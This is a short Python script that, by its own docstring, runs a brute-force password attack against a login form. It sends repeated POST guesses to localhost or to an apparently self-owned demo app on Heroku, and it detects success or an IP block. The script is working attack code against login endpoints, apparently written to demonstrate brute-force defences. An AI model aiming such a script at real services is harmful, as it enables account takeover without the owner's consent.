#!/usr/bin/env python3

' Performs brute-force attacks against the target '

import time, sys
import requests, itertools
from flask_app import var

try:
    if sys.argv[1]:
        url = 'http://localhost:8080/'  # test on localhost
except Exception:
    url = 'http://brutefo.herokuapp.com/'

print(url[7:-1])

headers = {'User-Agent': 'Mozilla'}
data = {
    'email': var.email,  # imported from flask_app
    'password': var.password
}
sess = requests.Session()
sess.headers['User-Agent'] = 'Mozilla'


def try_password(trial=''):
    ' Send POST request attempt with password '
    try:
        data['password'] = ''.join(trial)
        print('Try:', data['password'])
        res = sess.post(url, data=data)
        if 'success' in res.text:  # if brute-force successful
            return 'Success'
        elif 'block' in res.text:  # IP is blocked by server
            return 'IP blocked'
    except Exception:
        pass  # if fail to post, retry
    return ''  # empty string if failed


def main():
    ' Perform Brute force attack '
    # correct_password = '.5_pFO*p6s8Kcj+U'
    
    start_text = 'abcdefghijklmnopqrstuvwxyz'  # text for first attempt
    length = len(start_text)  # how many char in password
    generator = itertools.combinations_with_replacement(start_text, length)
    for password in generator:
        res = try_password(password)
        if res:  # if there is response, stop attack
            print(res)
            break
        time.sleep(1)  # wait for 1 second before next attempt


if __name__ == '__main__':
    main()
